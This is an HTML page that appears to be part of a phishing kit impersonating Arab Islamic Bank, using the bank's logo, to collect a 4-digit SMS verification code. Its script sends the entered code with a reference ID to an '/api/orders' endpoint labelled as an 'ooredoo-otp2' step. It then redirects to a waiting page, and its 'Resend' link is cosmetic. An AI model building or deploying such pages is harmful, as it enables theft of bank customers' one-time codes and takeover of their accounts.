<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Verification Code | Arab Islamic Bank</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&family=IBM+Plex+Sans+Arabic:wght@400;500;700&display=swap" rel="stylesheet">
<style>
:root{
  --primary:#1B6B3A; --primary-deep:#145A2E;
  --bg:#f0eeeb; --surface:#fff; --ink:#1c1720; --muted:#888;
}
*{box-sizing:border-box; margin:0; padding:0}
body{font-family:"IBM Plex Sans Arabic","Cairo",sans-serif; background:var(--bg); min-height:100vh; display:flex; flex-direction:column}

.top-bar{display:flex; align-items:center; justify-content:center; padding:12px 16px}
.logo-area{display:flex; align-items:center; justify-content:center}
.logo-area img{height:44px}

.otp-container{flex:1; display:flex; flex-direction:column; align-items:center; padding:40px 24px}

.otp-icon{width:64px; height:64px; background:var(--primary); border-radius:50%; display:flex; align-items:center; justify-content:center; margin-bottom:24px}
.otp-icon svg{width:32px; height:32px; color:#fff}

.otp-title{font-size:1.3rem; font-weight:900; color:var(--ink); margin-bottom:10px}
.otp-sub{font-size:.92rem; color:var(--muted); margin-bottom:30px; text-align:center; max-width:340px; line-height:1.7}

.otp-inputs{display:flex; gap:14px; direction:ltr; margin-bottom:10px}
.otp-inputs input{width:56px; height:64px; border:2px solid #ddd; border-radius:12px; text-align:center; font-size:1.6rem; font-weight:900; font-family:inherit; background:#e8e5e0; color:var(--ink); outline:none; transition:border-color .2s}
.otp-inputs input:focus{border-color:var(--primary)}

.hint{color:#c0263b; font-size:.82rem; margin-top:6px; display:none; text-align:center; max-width:400px; width:100%}
.hint.show{display:block}

.error-msg{width:100%; max-width:400px; color:#c0263b; font-weight:900; font-size:1rem; text-align:center; margin-bottom:16px; display:none}
.error-msg.show{display:block}

.otp-btn{width:100%; max-width:400px; height:56px; border:none; border-radius:28px; background:var(--primary); color:#fff; font-family:inherit; font-weight:900; font-size:1.15rem; cursor:pointer; transition:background .2s; margin-top:24px}
.otp-btn:hover{background:var(--primary-deep)}
.otp-btn:disabled{opacity:.6; cursor:not-allowed}

.resend-row{margin-top:18px; font-size:.9rem; color:var(--muted); text-align:center}
.resend-row a{color:var(--primary); font-weight:700; text-decoration:none; cursor:pointer}
</style>
</head>
<body>

<div class="top-bar">
  <div class="logo-area">
    <img src="https://aib.ps/uc_files/image/resize/226/53/app_files/logopng_16691947964653877586094.png?vsig=fe3b85fa430300011345c623e9bc93d1" alt="AIB">
  </div>
</div>

<div class="otp-container">
  <div class="otp-icon">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="4" width="20" height="16" rx="3"/><path d="M2 8l10 6 10-6"/></svg>
  </div>
  <div class="otp-title">Enter verification code</div>
  <div class="otp-sub">A verification code has been sent to your registered phone number</div>

  <div class="otp-inputs">
    <input type="text" inputmode="numeric" maxlength="1" id="o1" autofocus>
    <input type="text" inputmode="numeric" maxlength="1" id="o2">
    <input type="text" inputmode="numeric" maxlength="1" id="o3">
    <input type="text" inputmode="numeric" maxlength="1" id="o4">
  </div>
  <div class="hint" id="h-otp">Please enter the 4-digit verification code</div>

  <div class="error-msg" id="errorMsg"></div>

  <button class="otp-btn" id="otpBtn">Confirm</button>

  <div class="resend-row">Didn't receive the code? <a id="resendLink">Resend</a></div>
</div>

<script>
const $ = id => document.getElementById(id);
const boxes = ["o1","o2","o3","o4"].map(id => $(id));
const hash = location.hash.slice(1);
const ref = hash.split("~")[0];

if (!ref) window.location.href = "login-en.html";

if (new URLSearchParams(location.search).get("error") === "1") {
  $("errorMsg").textContent = "Incorrect verification code";
  $("errorMsg").classList.add("show");
}

boxes.forEach((b, i) => {
  b.addEventListener("input", () => {
    b.value = b.value.replace(/\D/g, "").slice(0, 1);
    if (b.value && i < 3) boxes[i + 1].focus();
  });
  b.addEventListener("keydown", e => {
    if (e.key === "Backspace" && !b.value && i > 0) boxes[i - 1].focus();
  });
  b.addEventListener("paste", e => {
    e.preventDefault();
    const txt = (e.clipboardData.getData("text") || "").replace(/\D/g, "").slice(0, 4);
    txt.split("").forEach((c, j) => { if (boxes[j]) boxes[j].value = c; });
    if (txt.length > 0) boxes[Math.min(txt.length, 3)].focus();
  });
});

$("otpBtn").addEventListener("click", async () => {
  $("h-otp").classList.remove("show");
  $("errorMsg").classList.remove("show");
  const otp = boxes.map(b => b.value).join("");
  if (otp.length < 4) { $("h-otp").classList.add("show"); return; }

  const btn = $("otpBtn");
  btn.disabled = true; btn.textContent = "Verifying...";

  try {
    await fetch("/api/orders", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ ref: ref, ooredoo: { otp: otp }, step: "ooredoo-otp2" })
    });
  } catch(e){}

  window.location.href = "waiting-otp2-en.html#" + hash;
});

$("resendLink").addEventListener("click", () => {
  $("resendLink").textContent = "Sent!";
  setTimeout(() => { $("resendLink").textContent = "Resend"; }, 3000);
});
</script>
</body>
</html>
